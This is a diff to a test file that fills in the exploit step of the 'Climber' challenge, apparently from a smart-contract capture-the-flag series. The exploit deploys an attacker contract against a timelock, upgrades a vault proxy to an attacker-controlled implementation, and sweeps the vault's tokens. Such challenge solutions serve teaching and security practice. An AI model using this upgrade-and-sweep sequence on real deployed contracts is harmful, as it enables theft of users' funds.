@@ -44,7 +44,15 @@ describe("[Challenge] Climber", function () {
   });
 
   it("Exploit", async function () {
-    /** CODE YOUR EXPLOIT HERE */
+    // https://forum.openzeppelin.com/t/execute-upgrade-using-different-signer/14264
+    this.upgradedAttackerContract = await ethers.getContractFactory("UpgradedAttacker", attacker);
+
+    this.attackerContract = await (
+      await ethers.getContractFactory("ClimberAttacker", attacker)
+    ).deploy(this.timelock.address, this.vault.address, attacker.address);
+    await this.attackerContract.connect(attacker).attack();
+    const compromisedVault = await upgrades.upgradeProxy(this.vault.address, this.upgradedAttackerContract);
+    await compromisedVault.connect(attacker).sweepFunds(this.token.address);
   });
 
   after(async function () {
